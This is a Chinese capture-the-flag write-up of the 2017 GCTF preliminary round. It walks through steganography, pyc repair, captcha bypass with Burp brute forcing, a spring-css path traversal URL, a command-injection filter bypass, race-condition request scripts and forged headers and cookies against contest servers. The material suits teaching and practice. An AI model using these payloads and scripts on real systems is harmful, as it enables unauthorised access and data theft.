---
title: 全球华人网络安全技能大赛(GCTF)初赛 Writeup 总结
date: 2017-06-13 13:43:46
tags:
- CTF
- Writeup
categories:
- CTF
---
比赛时间:24小时(2017年6月10日上午09：00-6月11日09：00)
很开心能参加这次比赛，遗憾的是自己做的题目还是太少了，重在参与吧

【本文仅为学习目的，如有侵权，请联系我删除】
<!-- more -->
# 简介

本次比赛一共20题：
- Misc 共3题
-- Stage1 
图片隐写，python反编译
-- test.pyc 
python反编译,去除stop code
--  reverseMe 
文件反转
- Reverse 共3题
-- Hackme
elf可执行文件逆向分析，堆栈不平衡
-- debug.exe
C#语言.Net程序逆向分析
-- 密码加密
jsp文件、jar包分析
- Web 共11题
-- PHP序列化
-- spring-css
存在已知漏洞CVE-2014-3625
-- 注入越权
引号、十六进制绕过
-- 条件竞争
数据库操作无死锁
-- 读文件
绕过WAF、过滤
-- WEB综合
一句话木马爆破
-- RCE绕过
十六进制绕过
-- JAVA序列化
如题
-- 变态验证码怎么破
验证码绕过、爆破密码
-- Forbidden
修改HTTP请求头信息、hex
-- 热身题
robots.txt
- Mobile 共2题
-- APK逆向
反编译，分析代码
-- APK逆向2
XML文件
- Pwn 共1题
-- FTP

涉及或需要使用Python脚本的题目共5题：Stage1、test.pyc、reverseMe、条件竞争、WEB综合
涉及抓包或需要使用Burpsuite的题目共2题：变态验证码怎么破、Forbidden
（注：有些题目抓不抓包都可以，则不计入）

战队           | GUT_CityU    |su-Root
---------------|--------------|--------------------
全部排名       |89            |101
港澳台排名     |1             |3
得分           |896           |704
解题数         |5             |4


# 自己做出来的题目

## Misc

### stage1
下载得到一张PNG图片
{% asset_img stage1_1.png %}
首先肯定是想到是否该文件其实不是PNG格式（隐藏了其它文件）
用winhex查看文件头，发现确实应该只是一张PNG图

使用Stegsolve打开查看各个颜色通道
在green plane 1通道发现一张二维码
{% asset_img stage1_2.png %}
截图保存二维码
{% asset_img stage1_3.png %}
进行反相（颜色取反）
{% asset_img stage1_4.png %}
扫码得到一串字符串
{% codeblock %}
03F30D0AB6266A576300000000000000000100000040000000730D0000006400008400005A00006401005328020000006300000000030000000800000043000000734E0000006401006402006403006404006405006406006405006407006708007D00006408007D0100781E007C0000445D16007D02007C01007400007C0200830100377D0100712B00577C010047486400005328090000004E6941000000696C000000697000000069680000006961000000694C0000006962000000740000000028010000007403000000636872280300000074030000007374727404000000666C6167740100000069280000000028000000007307000000746573742E7079520300000001000000730A00000000011E0106010D0114014E280100000052030000002800000000280000000028000000007307000000746573742E707974080000003C6D6F64756C653E010000007300000000
{% endcodeblock %}
猜测为十六进制串，使用winhex保存为文件
{% asset_img stage1_5.png %}
发现为python的pyc格式，保存为test.pyc
反编译得到代码
{% codeblock test.py lang:Python %}
#!/usr/bin/env python
# encoding: utf-8
def flag():
    str = [65, 108, 112, 104, 97, 76, 97, 98]
    flag = ''
    for i in str:
        flag += chr(i)
    
    print flag
{% endcodeblock %}
运行得到flag：AlphaLab
注：Python反编译可使用[在线反编译工具](https://tool.lu/pyc/)

## Web
### 变态验证码怎么破
打开网站发现是登陆界面
{% asset_img vcode_1.png %}
注释中提示用户名为ADMIN，密码在password.txt文件中
{% asset_img vcode_2.png %}
下载password.txt文件，里面是1000个可能的密码，想到爆破密码
{% asset_img vcode_3.png %}
但是有验证码，尝试使用Python pytesseract识别验证码，再爆破【该步骤只是思路】
{% asset_img vcode_4.png %}
可惜正如题目“变态验证码怎么破”，这道题中的验证码是16位的字母+数字
pytesseract对此的识别率太低，爆破1000个密码需要的时间太长，遂放弃。

转而想到绕过验证码
设置好代理，使用Burpsuit抓包【注：此处验证码需要输入正确】
即网站返回结果提示必须为username or password error，不能是vcode error
将抓到的包发送到intruder
然后将包forward【注：一定要forward！！！必须先验证成功一次验证码】
此处网页应返回提示username or password error
{% asset_img vcode_5.png %}
转到intruder，positions页，去掉所有的$$，只保留password变量的$$，去掉验证码的值
{% asset_img vcode_6.png %}
转到payloads页，点击load，加载前面下载好的password.txt
{% asset_img vcode_7.png %}
password.txt中的所有密码都会加载进来

换到options页，给网页返回结果加判断，方便寻找结果
先点击clear清除所有，在加上error提示
{% asset_img vcode_8.png %}
即只提示error即可，并关闭exclude HTTP headers提示
{% asset_img vcode_9.png %}
Intruder——start attack开始爆破
{% asset_img vcode_10.png %}
耐心等待爆破完成（此处只列出部分图）
{% asset_img vcode_11.png %}
前面我们设置了error判断，所以只关注error一列即可
凡是打勾的表示网页返回的都是提示username or password error
即密码错误，所以找没打勾的一项即可
发现第595行的密码wjsddslh未提示错误，即该密码正确
{% asset_img vcode_12.png %}
查看网页返回值response
{% asset_img vcode_13.png %}
可以看到GCTF{Qb8HR4pGmScMqgxTSwP7QZmb}，即本题flag

# 其他人的Writeup总结
注：本文引用内容只为学习目的，如有侵权，请联系我删除
## Misc

### test.pyc
下载下来为一个pyc文件
{% asset_img test.pyc_1.png %}
同样想到反编译，提示部分代码没有反编译成功
{% asset_img test.pyc_2.png %}
使用Winhex打开pyc文件
分析得知在flag3()前面有STOP_CODE
将四个00改成09(nop)可顺利反编译（引用自附录[1]）
{% asset_img test.pyc_3.png %}
得到python代码，修改得到
{% codeblock lang:Python %}
#!/usr/bin/env python
# encoding: utf-8

str = '=cWbihGfyMzNllzZ'+'0cjZzMW'+'N5cTM4Y'+'jYygTOy' + 'cmNycWNyYmM1Ujf'
#注：笔者这里使用在线反编译无法完全反编译出该字符串，该字符串引用自附录[1]
import base64

def flag1():
    code = str[::-3]
    result = ''
    for i in code:
        ss = ord(i) - 1
        result += chr(ss)
    print (result[::-1])

def flag2():
    code = str[::-2]
    result = ''
    for i in code:
        ss = ord(i) - 1
        result += chr(ss)
    print (result[::-2])

def flag3():
    code = str[::-1]
    code = base64.b64decode(code)  #（base64解密输出结果为bytes，需转为str）
    print (code)            #额外添加的语句 输出base64解密后的字符串
                            #额外添加的语句 直接使code等于base64解密后的字符串
    code = "~552f25g26g2982b681795c3f74g9e732|hbmg"     #base64解密结果
    result = ''
    for i in code:
        ss = ord(i) - 1     #直接运行反编译后的代码Python3此处存在报错，原因见上()括号内容
        result += chr(ss)
    print (result[::-1])
flag1()
flag2()
flag3()
{% endcodeblock %}
运行得到flag{126d8f36e2b486075a1781f51f41e144}
{% asset_img test.pyc_4.png %}
这里也附上R00t战队Writeup中的python反编译脚本（笔者同样在Python3下无法运行，感兴趣可以自行尝试）
{% codeblock lang:Python %}
import dis, marshal, struct, sys, time, types

def show_file(fname):
    f = open(fname, "rb")
    magic = f.read(4)
    moddate = f.read(4)
    modtime = time.asctime(time.localtime(struct.unpack('I', moddate)[0]))
    print ("magic %s" % (magic.encode('hex')))
    print ("moddate %s (%s)" % (moddate.encode('hex'), modtime))
    code = marshal.load(f)
    show_code(code)
    
def show_code(code, indent=''):
    print ("%scode" % indent)
    indent += '   '
    print ("%sargcount %d" % (indent, code.co_argcount))
    print ("%snlocals %d" % (indent, code.co_nlocals))
    print ("%sstacksize %d" % (indent, code.co_stacksize))
    print ("%sflags %04x" % (indent, code.co_flags))
    show_hex("code", code.co_code, indent=indent)
    dis.disassemble(code)
    print ("%sconsts" % indent)
    for const in code.co_consts:
        if type(const) == types.CodeType:
            show_code(const, indent+'   ')
        else:
            print ("   %s%r" % (indent, const))
    print ("%snames %r" % (indent, code.co_names))
    print ("%svarnames %r" % (indent, code.co_varnames))
    print ("%sfreevars %r" % (indent, code.co_freevars))
    print ("%scellvars %r" % (indent, code.co_cellvars))
    print ("%sfilename %r" % (indent, code.co_filename))
    print ("%sname %r" % (indent, code.co_name))
    print ("%sfirstlineno %d" % (indent, code.co_firstlineno))
    show_hex("lnotab", code.co_lnotab, indent=indent)
    
def show_hex(label, h, indent):
    h = h.encode('hex')
    if len(h) < 60:
        print ("%s%s %s" % (indent, label, h))
    else:
        print ("%s%s" % (indent, label))
        for i in range(0, len(h), 60):
            print ("%s   %s" % (indent, h[i:i+60]))
            
show_file("1.pyc")
{% endcodeblock %}

### ReverseMe
下载后为一个.reverseMe后缀文件（Reverse的中文意思是反转、颠倒）
{% asset_img ReverseMe_1.png %}
使用winhex打开后发现是.jpg文件 十六进制值颠倒后的结果
如下，原字符串应为 Adobe Photoshop CS6 Windows 2016:10:24 11:57:30
{% asset_img ReverseMe_2.png %}
故编写脚本得：（该脚本运行比较慢）
{% codeblock lang:Python %}
#!/usr/bin/env python
# encoding: utf-8

with open("ae0c42b1-5e0d-4600-abc8-40f36a763061.reverseMe", "rb") as file:
    with open("result.jpg", "wb") as jpg:    
        data = []
        byte = file.read(1)
        while byte != b"":
            data.append(byte)
            byte = file.read(1)
        for i in reversed(data):
            jpg.write(i)
{% endcodeblock %}
运行得到一张图片，打开如下
{% asset_img ReverseMe_3.jpg %}
镜面反转得到flag
{% asset_img ReverseMe_4.jpg %}

## Reverse
### Hackme
### debug.exe
### 密码加密

























## Web

### PHP序列化

### spring-css
使用AWVS扫描，发现CVE-2014-3625漏洞
{% asset_img spring-css_1.png %}
漏洞使用方法
http://218.2.197.232:18015/spring-css/resources/file:/etc/flag
{% asset_img spring-css_2.png %}

### 注入越权
源代码提示需要uid=0且role=admin
{% asset_img 注入越权_1.png %}
使用Brupsuite抓包
{% asset_img 注入越权_2.png %}
修改payload，加入 &uid=0,role=0x61646d696e
{% asset_img 注入越权_3.png %}
Forward得到flag
{% asset_img 注入越权_4.png %}
{% asset_img 注入越权_5.png %}

### 条件竞争
题目可查看源码如下
{% asset_img 条件竞争_1.png %}
由题目提示可知
用户是否有权限是通过查询数据库中 notadmin 一列是否为 true 来判断的

而重置用户信息的过程为先删除原本的用户信息，再插入新的用户信息
在这个过程中，存在一小段时间，notadmin 一列的值不为 true
此时查询用户信息，用户就具备了管理员权限

即重置密码与登录函数之间存在竞争（操作数据库时没有锁死数据库操作）
编写脚本重复重置密码和登录，如下，即可得到GCTF{KBnLGG6qR2ZdYe4HbUL8XpAP}
{% asset_img 条件竞争_2.png %}
脚本代码如下：
{% codeblock login.py lang:Python %}
#!/usr/bin/env python
# encoding: utf-8
import requests

url = 'http://218.2.197.242:18009/login.php?method=login'

headers = {
    'Cookie':'PHPSESSID=u40qo7g1pfmaqrqgvfv54npog2',  #需要修改为自己的Session ID
    }

data = {
    'name':'cac5000af8fe6fd0',   #修改为自己的用户名
    'password':'123456'          #修改为自己的密码
    }

while(True):
    result = requests.post(url = url,data = data,headers = headers)
    if(result.text != r'无权限' and result.text != r'用户名或密码错误'):
        print(result.text)
        break

{% endcodeblock %}

{% codeblock change.py lang:Python %}
#!/usr/bin/env python
# encoding: utf-8
import requests

url = 'http://218.2.197.242:18009/index.php?method=reset'

headers = {
    'Cookie':'PHPSESSID=u40qo7g1pfmaqrqgvfv54npog2',  #需要修改为自己的Session ID
    }

data = {
    'name':'cac5000af8fe6fd0',   #修改为自己的用户名
    'password':'123456'          #修改为自己的密码
    }

while(True):
    result = requests.post(url = url,data = data,headers = headers)
    if(result.text == r'修改成功'):
        print(result.text)
{% endcodeblock %}

### 读文件
### WEB综合















### RCE绕过
原网址 http://218.2.197.232:18006/?cmd=test 结果为执行curltestflag.php
{% asset_img RCE绕过_1.png %}
使用%0a替换空格，%09代替.
即会执行cat flag.php命令，成功get flag
{% asset_img RCE绕过_2.png %}

### JAVA序列化
















### Forbidden

直接访问显示403页面,返回头信息是200，说明是假的假的假的403
{% asset_img Forbidden_1.png %}
使用Burpsuite抓包，并send to repeater
{% asset_img Forbidden_2.png %}
源码提示1.只允许本机访问，设置X-forwarded-for: localhost（127.0.0.1无效）
{% asset_img Forbidden_3.png %}
{% asset_img Forbidden_4.png %}
go之后得到
源码提示2.只能通过域名访问,设置Host: www.topsec.com
{% asset_img Forbidden_5.png %}
{% asset_img Forbidden_6.png %}
go之后得到
源码提示3.只允许从百度跳转到本页面访问,设置 Referer: http://www.baidu.com
{% asset_img Forbidden_7.png %}
{% asset_img Forbidden_8.png %}
go之后得到
源码提示4.只允许使用ajax访问本页面,设置X-Requested-With:XMLHttpRequest
{% asset_img Forbidden_9.png %}
{% asset_img Forbidden_10.png %}
go之后得到
源码提示5.只允许ie4访问，设置User-Agent: Mozilla/4.0 (compatible; MSIE 4.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)
{% asset_img Forbidden_11.png %}
{% asset_img Forbidden_12.png %}
go之后得到
源码提示6.电脑上必须装有.NET8，设置User-Agent: Mozilla/4.0 (compatible; MSIE 4.0; Windows NT 5.1; SV1; .NET CLR 8.0.50727)
{% asset_img Forbidden_13.png %}
{% asset_img Forbidden_14.png %}
go之后得到
源码提示7.只允许德国用户访问,设置Accept-Language: de-DE,de;
{% asset_img Forbidden_15.png %}
{% asset_img Forbidden_16.png %}
go之后得到
提示8.提示没有登录，同时返回的请求包里面显示:Set-Cookie: login=4e6a59324d545a6a4e7a4d324e513d3d
{% asset_img Forbidden_17.png %}
添加cookie为login=4e6a59324d545a6a4e7a4d324e513d3d，
经过hex-base64-hex解码得到false（即改为true即可）
将true经过hex-base64-hex编码之后得到4e7a51334d6a63314e6a553d
于是设置: Cookie: login=4e7a51334d6a63314e6a553d
{% asset_img Forbidden_18.png %}
{% asset_img Forbidden_19.png %}

### 热身题
打开网址得到一句提示
{% asset_img 热身题_1.png %}
查看robots.txt文件发现目录
{% asset_img 热身题_2.png %}
在rob0t.php中发现flag
{% asset_img 热身题_3.png %}

## Moblie
### APK逆向
### APK逆向2
## Pwn
### FTP

# 参考资料

非常感谢以下列出的与未列出的各篇文章与资料，本文内容为学习了以下资料的产物
再次表示忠心的感谢

本文中也引用了以下资料中的部分图片、文字等
【本文仅为学习目的，如有侵权，请联系我删除】

[1][GCTF 2017 WriteUp —— r00t](https://www.xctf.org.cn/information/8fff0eb06016734668a7d723fffffed95708243e/)

本文最后更新于 2017/6/15 14:35